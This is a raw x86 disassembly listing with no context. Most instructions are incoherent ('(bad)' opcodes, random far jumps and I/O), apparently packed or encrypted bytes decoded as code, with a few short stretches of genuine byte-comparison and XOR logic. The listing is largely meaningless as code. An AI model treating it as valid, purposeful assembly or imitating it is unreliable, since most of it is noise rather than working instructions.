  410cb2:	iret   
  410cb3:	xchg   ebx,eax
  410cb4:	mov    bh,0xd4
  410cb6:	dec    eax
  410cb7:	mov    edx,0x1889c6e9
  410cbc:	mov    edx,0x95d7f671
  410cc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cc2:	mov    al,ds:0xd6938416
  410cc7:	push   eax
  410cc8:	mov    edi,0x365bf265
  410ccd:	pop    edi
  410cce:	mov    ebx,0x235ca0af
  410cd3:	je     0x410d15
  410cd5:	mov    ds:0x318fd3b5,eax
  410cda:	dec    edx
  410cdb:	lods   eax,DWORD PTR gs:[esi]
  410cdd:	push   edi
  410cde:	mov    edi,DWORD PTR [ebx+eax*4+0x70e0fda4]
  410ce5:	mov    BYTE PTR [ebx],bh
  410ce7:	cmp    al,0xee
  410ce9:	push   esp
  410cea:	xlat   BYTE PTR ds:[ebx]
  410ceb:	fsub   DWORD PTR [ebx+0x3ef217d1]
  410cf1:	xchg   ebp,eax
  410cf2:	inc    esp
  410cf3:	(bad)  [ebx]
  410cf5:	cs sahf 
  410cf7:	inc    edi
  410cf8:	call   0xb911c001
  410cfd:	sbb    BYTE PTR [edi-0x151914df],bh
  410d03:	jne    0x410d68
  410d05:	and    cl,BYTE PTR [ebx+0x22]
  410d08:	pop    edx
  410d09:	scas   eax,DWORD PTR es:[edi]
  410d0a:	std    
  410d0b:	mov    cl,BYTE PTR [ecx-0x7ba74fe]
  410d11:	jmp    0x410fdf
  410d16:	je     0x410d40
  410d18:	(bad)  
  410d19:	push   cs
  410d1a:	push   edx
  410d1b:	lock je 0x410d8e
  410d1e:	outs   dx,BYTE PTR ds:[esi]
  410d1f:	dec    ecx
  410d20:	mov    edi,0xd89edf9c
  410d25:	arpl   bx,bp
  410d27:	mov    eax,0x7caf7e7e
  410d2c:	jle    0x410dac
  410d2e:	jmp    0xe43f:0xc6cf2de
  410d35:	(bad)  
  410d36:	int    0xf9
  410d38:	jmp    DWORD PTR [edx-0x5cfba00e]
  410d3e:	mov    ecx,0x25b42962
  410d43:	sar    DWORD PTR [edi],cl
  410d45:	hlt    
  410d46:	(bad)  
  410d47:	(bad)  [bx+si]
  410d4a:	pop    ebp
  410d4b:	inc    edi
  410d4c:	pop    esp
  410d4d:	push   0xc1496942
  410d52:	das    
  410d53:	int3   
  410d54:	fcom   DWORD PTR [edi-0x5673b66b]
  410d5a:	xor    eax,0x6ec42810
  410d5f:	(bad)  [esi]
  410d61:	lahf   
  410d62:	std    
  410d63:	test   dl,al
  410d65:	add    al,0x99
  410d67:	mov    al,ds:0xfa46a102
  410d6c:	jne    0x410da6
  410d6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d6f:	jecxz  0x410d3e
  410d71:	inc    eax
  410d72:	inc    ecx
  410d73:	push   edi
  410d74:	std    
  410d75:	push   es
  410d76:	jg     0x410d16
  410d78:	in     al,dx
  410d79:	pop    ss
  410d7a:	inc    esi
  410d7b:	fwait
  410d7c:	dec    ecx
  410d7d:	and    eax,0x9682b307
  410d82:	xchg   BYTE PTR [eax-0x3a],bh
  410d85:	push   cs
  410d86:	push   esi
  410d87:	test   al,0xfd
  410d89:	or     BYTE PTR [ebp-0x61],ah
  410d8c:	pop    eax
  410d8d:	sbb    DWORD PTR [edx+0x6673b945],ebp
  410d93:	push   ebp
  410d94:	test   ecx,eax
  410d96:	(bad)  
  410d97:	js     0x410ded
  410d99:	mov    dh,0xa3
  410d9b:	stos   BYTE PTR es:[edi],al
  410d9c:	sub    BYTE PTR [eax+ebx*8],dl
  410d9f:	or     al,BYTE PTR [ecx+esi*8]
  410da2:	mov    dl,0xba
  410da4:	icebp  
  410da5:	inc    eax
  410da6:	call   0xada3:0x4e2a447d
  410dad:	mov    esp,0xcb9abb56
  410db2:	sahf   
  410db3:	sti    
  410db4:	out    dx,al
  410db5:	push   0xf
  410db7:	rcl    edi,cl
  410db9:	xchg   esi,eax
  410dba:	gs inc ecx
  410dbc:	test   al,0xbf
  410dbe:	xchg   esp,eax
  410dbf:	mov    edi,0x5049061a
  410dc4:	add    BYTE PTR [esi+edi*1+0x41],ch
  410dc8:	lea    esp,[ebp-0x75bf30a8]
  410dce:	sbb    esi,esi
  410dd0:	inc    esi
  410dd1:	lahf   
  410dd2:	idiv   DWORD PTR [ebx-0x2e]
  410dd5:	es pop edx
  410dd7:	(bad)  
  410dd9:	jmp    0xbcff:0x5083454a
  410de0:	call   0xd171:0x6527d0fc
  410de7:	mov    esp,ebx
  410de9:	pusha  
  410dea:	push   ebx
  410deb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410dec:	cmp    al,0xbf
  410dee:	push   ds
  410def:	or     ebx,DWORD PTR [edx+ebx*8+0x186bc8ef]
  410df6:	mov    al,ds:0x2ded89fa
  410dfb:	or     bl,dl
  410dfd:	add    DWORD PTR [esp+ebp*1+0x53e110a2],esi
  410e04:	sbb    ah,BYTE PTR [esi-0x23]
  410e07:	js     0x410e83
  410e09:	xlat   BYTE PTR ds:[ebx]
  410e0a:	in     al,0xf8
  410e0c:	jge    0x410dd3
  410e0e:	add    eax,0x6dc62318
  410e13:	xchg   esi,eax
  410e14:	jmp    0x1c8293b8
  410e19:	gs jp  0x410e21
  410e1c:	bound  ebx,QWORD PTR [esi+0x56fbd6fb]
  410e22:	fwait
  410e23:	(bad)  
  410e24:	enter  0x4c3d,0x74
  410e28:	lds    edi,FWORD PTR [eax-0x31]
  410e2b:	cmp    eax,0xa930a241
  410e30:	pop    ds
  410e31:	adc    esp,DWORD PTR [esi]
  410e33:	inc    ebp
  410e34:	xor    al,0x1f
  410e36:	int    0xf7
  410e38:	and    BYTE PTR [eax-0x74],cl
  410e3b:	inc    esp
  410e3c:	xor    eax,0x24788d2c
  410e41:	test   al,0xc3
  410e43:	nop
  410e44:	push   0xacb874a8
  410e49:	adc    BYTE PTR [edi+0x69],0xfb
  410e4d:	sub    BYTE PTR [ecx+ebx*8+0xc],0x88
  410e52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e53:	and    eax,edx
  410e55:	lods   eax,DWORD PTR ds:[esi]
  410e56:	cmp    DWORD PTR [eax],edi
  410e58:	sbb    eax,0x1aebd4f6
  410e5d:	ss push cs
  410e5f:	push   edx
  410e60:	aad    0x44
  410e62:	adc    eax,0x94bc181d
  410e67:	inc    esi
  410e68:	jo     0x410e95
  410e6a:	call   FWORD PTR [ebx+0x1a]
  410e6d:	shl    BYTE PTR [ecx-0x1899442b],1
  410e73:	sub    esp,DWORD PTR [ebx-0x1257793e]
  410e79:	push   eax
  410e7a:	mov    ecx,DWORD PTR [eax+0x19511233]
  410e80:	sar    BYTE PTR [ebp+0x7c],0xd0
  410e84:	ja     0x410efe
  410e86:	imul   ebp,DWORD PTR [esi+0x77e6a55b],0x79
  410e8d:	repnz push esi
  410e8f:	int3   
  410e90:	ret    0x16ad
  410e93:	pop    eax
  410e94:	push   cs
  410e95:	cdq    
  410e96:	shl    eax,cl
  410e98:	xchg   DWORD PTR [eax],eax
  410e9a:	sbb    DWORD PTR ds:0xf85f0662,edx
  410ea0:	aad    0x25
  410ea2:	xchg   ebx,eax
  410ea3:	cld    
  410ea4:	clc    
  410ea5:	aaa    
  410ea6:	cli    
  410ea7:	sbb    eax,0x9c62130b
  410eac:	and    DWORD PTR es:[ebx+0x40621a03],esp
  410eb3:	jb     0x410f00
  410eb5:	fidivr WORD PTR [ecx-0x568ef2b]
  410ebb:	and    BYTE PTR [ebp-0x1c],al
  410ebe:	scas   al,BYTE PTR es:[edi]
  410ebf:	xchg   ebx,eax
  410ec0:	sub    eax,0x13de7463
  410ec5:	cmp    dl,BYTE PTR [esi-0x14]
  410ec8:	popa   
  410ec9:	lods   eax,DWORD PTR ds:[esi]
  410eca:	aam    0xc3
  410ecc:	in     eax,0x19
  410ece:	xor    ebx,edx
  410ed0:	pop    esp
  410ed1:	les    esp,FWORD PTR [edx]
  410ed3:	(bad)  
  410ed4:	nop
  410ed5:	test   al,0xe8
  410ed7:	scas   eax,DWORD PTR es:[edi]
  410ed8:	mov    eax,ds:0xdd10477
  410edd:	icebp  
  410ede:	mov    esp,0xda846bb6
  410ee3:	ja     0x410eac
  410ee5:	push   edi
  410ee6:	aam    0x3
  410ee8:	push   esp
  410ee9:	push   eax
  410eea:	push   ebx
  410eeb:	cmp    dh,BYTE PTR [edi+edi*2]
  410eee:	dec    ecx
  410eef:	push   esp
  410ef0:	ret    
  410ef1:	xchg   ecx,eax
  410ef2:	stc    
  410ef3:	mov    eax,ds:0xe17a06b6
  410ef8:	mov    al,0x7
  410efa:	push   esi
  410efb:	and    eax,0xf6889c2d
  410f00:	pushf  
  410f01:	dec    ebp
  410f02:	xchg   esi,eax
  410f03:	lahf   
  410f04:	fsubr  st(2),st
  410f06:	gs push edx
  410f08:	lahf   
  410f09:	ffree  st(3)
  410f0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f0c:	mov    esp,esp
  410f0e:	mov    al,0x2d
  410f10:	mov    ah,0x72
  410f12:	jmp    FWORD PTR [ebx]
  410f14:	lods   al,BYTE PTR ds:[esi]
  410f15:	push   ebp
  410f16:	cmp    esp,DWORD PTR [ebx+0x4b689e46]
  410f1c:	add    al,0x71
  410f1e:	out    0x70,al
  410f20:	std    
  410f21:	rcr    DWORD PTR [edi-0x72],cl
  410f24:	sub    DWORD PTR [edi-0x7d],esi
  410f27:	loopne 0x410f87
  410f29:	sub    DWORD PTR ds:0x6364c2ea,0x4e
  410f30:	jle    0x410f17
  410f32:	lahf   
  410f33:	mov    edi,0xe6e0694e
  410f38:	mov    al,0x10
  410f3a:	cmp    eax,0x31f5c5ec
  410f3f:	push   edx
  410f40:	jg     0x410f1d
  410f42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f43:	mov    al,ds:0xd2d1a4
  410f48:	jo     0x410efe
  410f4a:	xor    al,0x6a
  410f4c:	push   ecx
  410f4d:	imul   eax,DWORD PTR [ecx],0x62b956a7
  410f53:	cmc    
  410f54:	cmc    
  410f55:	ds in  eax,dx
  410f57:	push   esi
  410f58:	je     0x410f0a
  410f5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f5b:	inc    ebp
  410f5c:	test   esi,esp
  410f5e:	add    DWORD PTR [esi+0x7c],0x5c3d8cc
  410f65:	mov    dh,0x22
  410f67:	or     eax,0xd4e1b67e
  410f6c:	xchg   edx,eax
  410f6d:	inc    ebx
  410f6e:	test   eax,0xa0e66876
  410f73:	ss ror edx,cl
  410f76:	mov    ebp,0x27bbb122
  410f7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f7c:	xchg   edx,eax
  410f7d:	mov    ah,0xd0
  410f7f:	ins    BYTE PTR es:[edi],dx
  410f80:	sar    esp,0x24
  410f83:	push   esp
  410f84:	xor    eax,0x1fb06b4a
  410f89:	sub    BYTE PTR [edi-0x970dc9],ch
  410f8f:	fmul   DWORD PTR [edx]
  410f91:	scas   eax,DWORD PTR es:[edi]
  410f92:	sub    edi,ebx
  410f94:	aad    0xeb
  410f96:	push   ecx
  410f97:	jle    0x410fd9
  410f99:	jecxz  0x410f9f
  410f9b:	mov    ds:0x4471dadd,al
  410fa0:	imul   edx,esi,0x89e97d8f
  410fa6:	mov    ds:0xb59ed40c,eax
  410fab:	ins    DWORD PTR es:[edi],dx
  410fac:	pop    esp
  410fad:	jae    0x410f7e
  410faf:	div    DWORD PTR [eax-0x41f204cb]
  410fb5:	mov    bh,0x1b
  410fb7:	adc    ah,BYTE PTR [edx-0x728acea1]
  410fbd:	sbb    edx,DWORD PTR [edx]
  410fbf:	out    0x4c,al
  410fc1:	ins    DWORD PTR es:[edi],dx
  410fc2:	mov    eax,0x85d2323a
  410fc7:	popf   
  410fc8:	je     0x410fa6
  410fca:	pop    es
  410fcb:	cli    
  410fcc:	xlat   BYTE PTR ds:[ebx]
  410fcd:	xchg   edx,eax
  410fce:	(bad)  
  410fcf:	out    0x8e,al
  410fd1:	mov    ch,0x38
  410fd3:	mov    edx,0xb3f0ead0
  410fd8:	push   ebx
  410fd9:	fsincos 
  410fdb:	push   edx
  410fdc:	dec    ebp
  410fdd:	push   0x3c1331a
  410fe2:	(bad)  
  410fe3:	mov    DWORD PTR [ebp+0x8],eax
  410fe6:	mov    eax,DWORD PTR [ebp+0x8]
  410fe9:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fed:	mov    dl,BYTE PTR [ebp-0x1]
  410ff0:	cmp    al,dl
  410ff2:	je     0x411303
  410ff8:	mov    eax,DWORD PTR [ebp+0x8]
  410ffb:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fff:	mov    edx,DWORD PTR [ebp+0xc]
  411002:	cmp    al,BYTE PTR [edx]
  411004:	jne    0x4115f7
  41100a:	mov    eax,DWORD PTR [ebp-0x8]
  41100d:	mov    edx,DWORD PTR [ebp+0xc]
  411010:	movsx  edx,BYTE PTR [edx]
  411013:	xor    eax,ecx
  411015:	add    eax,esi
  411017:	cmp    edx,eax
  411019:	jmp    0x4112e7
  41101e:	jmp    0x411054
  411020:	push   esp
  411021:	dec    ebx
  411022:	push   ecx
  411023:	imul   esi,ecx,0xffffffb4
  411026:	and    DWORD PTR [edx-0x16],esi
  411029:	loope  0x410fe9
  41102b:	ficomp WORD PTR [ecx+0x7e471864]
  411031:	jle    0x410fe2
  411033:	jl     0x4110b3
  411035:	jle    0x411045
  411037:	out    0x47,al
  411039:	stos   DWORD PTR es:[edi],eax
  41103a:	cs and edi,esi
  41103d:	lods   al,BYTE PTR ds:[esi]
  41103e:	mov    BYTE PTR [ebx+eiz*4+0x19],al
  411042:	cli    
  411043:	hlt    
  411044:	push   cs
  411045:	push   ebx
  411046:	add    al,0xb5
  411048:	leave  
  411049:	popf   
  41104a:	sub    DWORD PTR [esi+esi*8],edi
  41104d:	mov    ebp,edx
  41104f:	mov    dh,0x74
  411051:	lock inc ebp
  411053:	inc    eax
  411054:	xor    ecx,esi
  411056:	out    dx,al
  411057:	pop    edx
  411058:	pop    esp
  411059:	daa    
  41105a:	shr    BYTE PTR [ebx+0x7d],0x5
  41105e:	sub    esp,DWORD PTR [edi+ebp*4]
  411061:	jmp    FWORD PTR [edi+0x13]
  411064:	mov    esi,0xa14e57a3
  411069:	add    ebx,DWORD PTR [ecx+0x2c29eb37]
  41106f:	hlt    
  411070:	cli    
  411071:	adc    edx,0xffffff86
  411074:	lods   eax,DWORD PTR ds:[esi]
  411075:	sbb    al,0xee
  411077:	mov    bl,0x4f
  411079:	sub    dh,BYTE PTR [ecx]
  41107b:	pop    eax
  41107c:	(bad)  
  41107d:	in     al,dx
  41107e:	push   esi
  41107f:	test   DWORD PTR [eax+0x34b95cac],0xad40a17f
  411089:	or     BYTE PTR [esi-0x2e],cl
  41108c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41108d:	and    ebp,DWORD PTR [edi+ecx*8-0x62f5f384]
  411094:	rcl    eax,1
  411096:	ret    0xec5a
  411099:	and    ch,BYTE PTR [edi+0x27aaedf5]
  41109f:	aaa    
  4110a0:	sub    DWORD PTR [eax+0x52],esp
  4110a3:	pop    ecx
  4110a4:	xchg   al,dh
  4110a6:	or     dh,BYTE PTR [edi+0x290fb9fd]
  4110ac:	and    cl,BYTE PTR [edx]
  4110ae:	sbb    edx,DWORD PTR [edi]
  4110b0:	fadd   st,st(6)
  4110b2:	push   cs
  4110b3:	rol    ah,0x3f
  4110b6:	adc    BYTE PTR [esi+esi*2],0x3
  4110ba:	push   edi
  4110bb:	mov    al,ds:0x59fa2334
  4110c0:	mov    BYTE PTR [eax-0x8],dl
  4110c3:	adc    al,BYTE PTR ss:[esp+eiz*2-0x27c19fd]
  4110cb:	shl    BYTE PTR [eax+edi*4],1
  4110ce:	jl     0x4110b2
  4110d0:	loop   0x4110f4
  4110d2:	jns    0x411091
  4110d4:	dec    ecx
  4110d5:	popa   
  4110d6:	sti    
  4110d7:	jge    0x4110de
  4110d9:	gs psubd mm7,mm0
  4110dd:	jge    0x4110bb
  4110df:	mov    dl,BYTE PTR [eax+eax*2-0x139c8983]
  4110e6:	jmp    0x2916:0xd0fdb900
  4110ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110ee:	ret    0xbef4
  4110f1:	imul   ebx,DWORD PTR [edi-0x68],0x108fd9c6
  4110f8:	call   0xde1:0xce44034e
  4110ff:	ds push ebp
  411101:	std    
  411102:	fidiv  DWORD PTR [ecx-0x73]
  411105:	cmp    dl,bh
  411107:	iret   
  411108:	stos   BYTE PTR es:[edi],al
  411109:	pusha  
  41110a:	jne    0x411114
  41110c:	xchg   edi,eax
  41110d:	jo     0x4110f1
  41110f:	cmp    eax,0x22621cbe
  411114:	(bad)  
  411115:	adc    eax,0x9d92fa24
  41111a:	out    0xef,eax
  41111c:	jge    0x4110cd
  41111e:	mov    edx,0xcba21f37
  411123:	rcr    DWORD PTR [edi+0x30],cl
  411126:	daa    
  411127:	ret    
  411128:	push   cs
  411129:	(bad)  
  41112a:	rcl    bl,0xa8
  41112d:	cwde   
  41112e:	es rcl edx,0x54
  411132:	mul    cl
  411134:	leave  
  411135:	sub    BYTE PTR [esi+eiz*8-0x35],dl
  411139:	addr16 inc edx
  41113b:	or     al,0xa8
  41113d:	push   edx
  41113e:	cmp    eax,0xccf331c6
  411143:	cmp    BYTE PTR [esi-0x6f7b0707],ch
  411149:	mov    dl,0x18
  41114b:	xor    ah,BYTE PTR ds:0x8c5b0063
  411151:	mov    DWORD PTR [esi],esi
  411153:	mov    ch,0xb4
  411155:	xchg   ebx,eax
  411156:	and    cl,dh
  411158:	mov    ch,0x2
  41115a:	lea    esp,[eax-0x1b]
  41115d:	xor    BYTE PTR [eax],bh
  41115f:	sub    esi,ecx
  411161:	pop    edx
  411162:	sub    eax,0x88b58e7
  411167:	(bad)  
  411168:	into   
  411169:	push   edi
  41116a:	sbb    DWORD PTR [esp+edx*8-0x24],ebp
  41116e:	outs   dx,BYTE PTR ds:[esi]
  41116f:	sbb    BYTE PTR [edi+ebp*4-0x1a],dl
  411173:	inc    esi
  411174:	mov    ds:0x192079c8,al
  411179:	lods   al,BYTE PTR ds:[esi]
  41117a:	lds    ebp,FWORD PTR ds:0x858f035f
  411180:	push   ecx
  411181:	xor    edi,ecx
  411183:	lods   eax,DWORD PTR ds:[esi]
  411184:	stc    
  411185:	pop    ds
  411186:	dec    esi
  411187:	push   ecx
  411188:	les    edx,FWORD PTR [ecx+0x19]
  41118b:	jo     0x4111e7
  41118d:	add    esp,DWORD PTR [ecx+0x75]
  411190:	scas   eax,DWORD PTR es:[edi]
  411191:	sub    ch,BYTE PTR [ebx-0x43]
  411194:	xchg   ecx,eax
  411195:	mov    eax,0xc3bc88fa
  41119a:	call   0x791179c6
  41119f:	sub    ah,cl
  4111a1:	xchg   edx,eax
  4111a2:	and    esp,DWORD PTR [edx+eiz*8-0x72]
  4111a6:	xor    ebp,DWORD PTR [ebp-0x8]
  4111a9:	ret    
  4111aa:	cld    
  4111ab:	mov    bh,0x1e
  4111ad:	mov    edx,0xf4bc6434
  4111b2:	and    al,0xb2
  4111b4:	mov    ds:0xd41dea55,eax
  4111b9:	pop    ss
  4111ba:	xor    BYTE PTR [esi-0x68],bl
  4111bd:	xor    al,0x56
  4111bf:	arpl   WORD PTR [edi-0x1f],si
  4111c2:	push   ebp
  4111c3:	test   eax,0x574b8867
  4111c8:	call   0x1eb3487e
  4111cd:	ins    BYTE PTR es:[edi],dx
  4111ce:	xchg   edx,eax
  4111cf:	mov    edx,0x75dac06
  4111d4:	es cmp eax,0x198d855d
  4111da:	ds inc edx
  4111dc:	ret    
  4111dd:	fist   WORD PTR [esi+0x49]
  4111e0:	cmp    BYTE PTR [esi-0x3370087e],dh
  4111e6:	inc    ebx
  4111e7:	repz xchg esp,eax
  4111e9:	das    
  4111ea:	xor    ecx,DWORD PTR [ebx]
  4111ec:	ja     0x411222
  4111ee:	mov    edi,0x6d165fc1
  4111f3:	nop
  4111f4:	dec    edi
  4111f5:	or     bh,0x82
  4111f8:	cdq    
  4111f9:	cmc    
  4111fa:	sbb    esp,edx
  4111fc:	jbe    0x411263
  4111fe:	js     0x411206
  411200:	pop    ss
  411201:	add    DWORD PTR [ecx+0x6e],esp
  411204:	sbb    BYTE PTR [edi],0xa4
  411207:	pop    edx
  411208:	stos   BYTE PTR es:[edi],al
  411209:	pop    ebx
  41120a:	repz mov ah,0x8c
  41120d:	inc    edi
  41120e:	popf   
  41120f:	fmul   DWORD PTR [ebx-0x400ef339]
  411215:	xor    esp,DWORD PTR ds:0xc36aed68
  41121b:	lods   eax,DWORD PTR ds:[esi]
  41121c:	xor    eax,0xcc2410
  411221:	mov    esi,0x5c879a38
  411226:	das    
  411227:	test   DWORD PTR [eax+0x3a],ebp
  41122a:	stos   BYTE PTR es:[edi],al
  41122b:	ins    DWORD PTR es:[edi],dx
  41122c:	jnp    0x411255
  41122e:	mov    dl,0x79
  411230:	or     dh,BYTE PTR [edx-0x71]
  411233:	mov    al,0x4b
  411235:	push   cs
  411236:	adc    bl,dh
  411238:	ficom  WORD PTR [edx-0xfc54733]
  41123e:	sbb    BYTE PTR [esi+ebx*2-0xc],ch
  411242:	(bad)  
  411243:	in     al,dx
  411244:	or     BYTE PTR [edi+ebx*4-0x338d22ea],dl
  41124b:	popa   
  41124c:	jg     0x41127c
  41124e:	pop    ecx
  41124f:	sbb    esi,DWORD PTR [eax+0x35]
  411252:	leave  
  411253:	and    edx,DWORD PTR [edx+0x3d]
  411256:	inc    ebx
  411257:	getsec 
  411259:	inc    eax
  41125a:	add    DWORD PTR [eax],esi
  41125c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41125d:	adc    eax,0xf1a3ff86
  411262:	pop    ss
  411263:	out    0xc8,eax
  411265:	xlat   BYTE PTR ds:[ebx]
  411266:	mov    bh,bh
  411268:	rcr    esi,0x9d
  41126b:	data16 jge 0x411201
  41126e:	inc    esi
  41126f:	pop    es
  411270:	cli    
  411271:	sti    
  411272:	outs   dx,BYTE PTR ds:[esi]
  411273:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411274:	daa    
  411275:	daa    
  411276:	je     0x411229
  411278:	repnz (bad) 
  41127a:	and    bh,al
  41127c:	loopne 0x411220
  41127e:	and    eax,0x22451d6c
  411283:	xchg   esi,eax
  411284:	push   ecx
  411285:	(bad)  
  411286:	les    ebp,FWORD PTR [ebx+0x20]
  411289:	xchg   dl,ah
  41128b:	adc    esp,0xffffffa7
  41128e:	sbb    cl,ah
  411290:	loopne 0x411261
  411292:	call   0x78f:0x499e0831
  411299:	test   ecx,0x98f4bc9
  41129f:	mov    fs,WORD PTR [edi]
  4112a1:	inc    ebp
  4112a2:	outs   dx,BYTE PTR ds:[esi]
  4112a3:	mov    ch,0xaf
  4112a5:	mov    esp,0x13f69536
  4112aa:	dec    esi
  4112ab:	fwait
  4112ac:	test   eax,0xcf448148
  4112b1:	add    ebp,DWORD PTR [edi+ebp*4-0x7e]
  4112b5:	fucomi st,st(5)
  4112b7:	dec    ebx
  4112b8:	pusha  
  4112b9:	pop    ss
  4112ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112bb:	or     ecx,DWORD PTR [ebx-0x380acdf5]
  4112c1:	lods   al,BYTE PTR ds:[esi]
  4112c2:	in     al,0x96
  4112c4:	mov    BYTE PTR [edx+0x46],ah
  4112c7:	and    eax,edi
  4112c9:	sbb    ebx,edx
  4112cb:	jp     0x4112e2
  4112cd:	pushf  
  4112ce:	pop    ss
  4112cf:	pop    ss
  4112d0:	add    ah,ah
  4112d2:	cmp    DWORD PTR [ecx+0x67],0x83921cb5
  4112d9:	es mov ch,0x28
  4112dc:	fs sti 
  4112de:	jae    0x411337
  4112e0:	iret   
  4112e1:	sub    DWORD PTR [edi+eiz*1+0xfe1ebad],ecx
  4112e8:	test   dh,bh
  4112ea:	add    al,BYTE PTR [eax]
  4112ec:	add    bh,al
  4112ee:	inc    ebp
  4112ef:	call   0x7471083
  4112f4:	lea    eax,[ebp-0x18]
  4112f7:	mov    DWORD PTR [ebp-0x14],eax
  4112fa:	mov    eax,DWORD PTR [ebp-0x14]
  4112fd:	add    DWORD PTR [eax],0x705fa8f
  411303:	mov    eax,DWORD PTR [ebp-0x10]
  411306:	jmp    0x4115d4
  41130b:	sub    al,0xc2
  41130d:	or     al,0xb3
  41130f:	lock jno 0x4112c3
  411312:	inc    ecx
  411313:	mov    ds:0x8968f61e,eax
  411318:	repnz xchg esi,eax
  41131a:	pop    ds
  41131b:	dec    ecx
  41131c:	inc    ebp
  41131d:	jle    0x41139d
  41131f:	scas   eax,DWORD PTR es:[edi]
  411320:	jl     0x4113a0
  411322:	jle    0x411342
  411324:	call   0xd0ed:0x3b315e1e
  41132b:	dec    esi
  41132c:	std    
  41132d:	mov    cl,0x8b
  41132f:	daa    
  411330:	cmp    eax,0x698e51dd
  411335:	add    ebp,DWORD PTR [esi-0x5a]
  411338:	and    ebp,DWORD PTR [ebx+ebx*8]
  41133b:	pop    esi
  41133c:	in     eax,0x80
  41133e:	adc    DWORD PTR [edi-0x5d],edx
  411341:	lods   al,BYTE PTR ds:[esi]
  411342:	retf   
  411343:	and    ebx,DWORD PTR [edx-0x299ca638]
  411349:	xchg   ch,cl
  41134b:	leave  
  41134c:	mov    edi,0x5b18824f
  411351:	push   edi
  411352:	ja     0x41134f
  411354:	stos   BYTE PTR es:[edi],al
  411355:	inc    ebp
  411356:	push   cs
  411357:	ins    BYTE PTR es:[edi],dx
  411358:	in     eax,dx
  411359:	loope  0x4113a7
  41135b:	push   esi
  41135c:	outs   dx,DWORD PTR ds:[esi]
  41135d:	imul   BYTE PTR [edi+0x3c]
  411360:	sbb    ch,bh
  411362:	adc    eax,0x6e1ef24d
  411367:	jmp    0xecd0:0xa29ebcd
  41136e:	xchg   ebx,eax
  41136f:	shr    DWORD PTR [edx+0x33],0x6f
  411373:	jg     0x411301
  411375:	popf   
  411376:	or     eax,0x87259250
  41137b:	out    dx,eax
  41137c:	add    al,0x83
  41137e:	mov    al,0xad
  411380:	or     al,0x48
  411382:	outs   dx,DWORD PTR ds:[esi]
  411383:	and    BYTE PTR [ecx+0x35],bl
  411386:	pop    esi
  411387:	push   esp
  411388:	inc    eax
  411389:	xor    ah,BYTE PTR [edi]
  41138b:	and    eax,DWORD PTR [ebp-0x6661a469]
  411391:	and    al,0xc2
  411393:	dec    ecx
  411394:	shl    edx,1
  411396:	or     BYTE PTR [ecx+0x7],cl
  411399:	ret    0x2df5
  41139c:	dec    ebx
  41139d:	sbb    BYTE PTR [edx+0x546a9195],0x9a
  4113a4:	outs   dx,DWORD PTR ds:[esi]
  4113a5:	dec    edi
  4113a6:	bound  ebx,QWORD PTR [esi-0x4bbdde1]
  4113ac:	mov    edi,0x40f73217
  4113b1:	lahf   
  4113b2:	imul   ebp,edx,0xdf3e4910
  4113b8:	adc    sp,WORD PTR ds:0x4542dce4
  4113bf:	pop    eax
  4113c0:	es adc bl,BYTE PTR ss:0x28c99837
  4113c8:	gs mov bh,0x61
  4113cb:	loope  0x4113b5
  4113cd:	sub    BYTE PTR [ebp+0x1c],al
  4113d0:	sbb    esp,ebx
  4113d2:	fs add eax,0x1f1660cd
  4113d8:	out    dx,al
  4113d9:	fnclex 
  4113db:	in     al,0x45
  4113dd:	push   es
  4113de:	and    ebx,DWORD PTR [esi-0x136e5f88]
  4113e4:	jb     0x4113a7
  4113e6:	mov    ds:0xaf644557,eax
  4113eb:	inc    ebx
  4113ec:	test   DWORD PTR [esi-0x10],ebx
  4113ef:	mov    ss,eax
  4113f1:	xor    edi,DWORD PTR [eax+0x21f32d8e]
  4113f7:	shr    ebx,0xca
  4113fa:	call   0xe728:0xba4dc883
  411401:	sahf   
  411402:	test   BYTE PTR [ecx-0x6aa8d575],ch
  411408:	push   cs
  411409:	cli    
  41140a:	mov    bl,0x74
  41140c:	rcl    DWORD PTR [eax-0x70318026],0x33
  411413:	jg     0x4113d3
  411415:	lods   eax,DWORD PTR ds:[esi]
  411416:	push   DWORD PTR [edi-0x40]
  411419:	pop    esp
  41141a:	mov    bh,0x4c
  41141c:	dec    ebx
  41141d:	les    esp,FWORD PTR [ebx+0x39]
  411420:	mov    ch,0xd0
  411422:	lock add bh,bh
  411425:	adc    al,0xcd
  411427:	repz lahf 
  411429:	sbb    eax,0x5096228f
  41142e:	or     BYTE PTR [esi-0x5e],cl
  411431:	enter  0xb7e4,0x20
  411435:	add    bh,cl
  411437:	aas    
  411438:	push   edi
  411439:	retf   0xecde
  41143c:	jb     0x41148c
  41143e:	hlt    
  41143f:	retf   
  411440:	adc    ebp,DWORD PTR [eax]
  411442:	xchg   DWORD PTR [eax+0x330210d7],ebx
  411448:	mov    bh,0x57
  41144a:	mov    eax,0x7234451e
  41144f:	ret    0xb9cb
  411452:	fpatan 
  411454:	lahf   
  411455:	js     0x41149c
  411457:	scas   eax,DWORD PTR es:[edi]
  411458:	sbb    bh,BYTE PTR [esi-0x4cdb6fb4]
  41145e:	mov    eax,0x3b979582
  411463:	lods   al,BYTE PTR ds:[esi]
  411464:	or     al,0x6
  411466:	in     al,dx
  411467:	or     BYTE PTR [ecx],bl
  411469:	mov    eax,ds:0x20c12031
  41146e:	add    ebx,DWORD PTR [ebx-0x43]
  411471:	in     eax,dx
  411472:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411473:	dec    ebp
  411474:	cli    
  411475:	icebp  
  411476:	ficom  DWORD PTR [ebp-0x11679e3a]
  41147c:	test   eax,0x43f29ec9
  411481:	jb     0x4114d3
  411483:	cmp    esp,eax
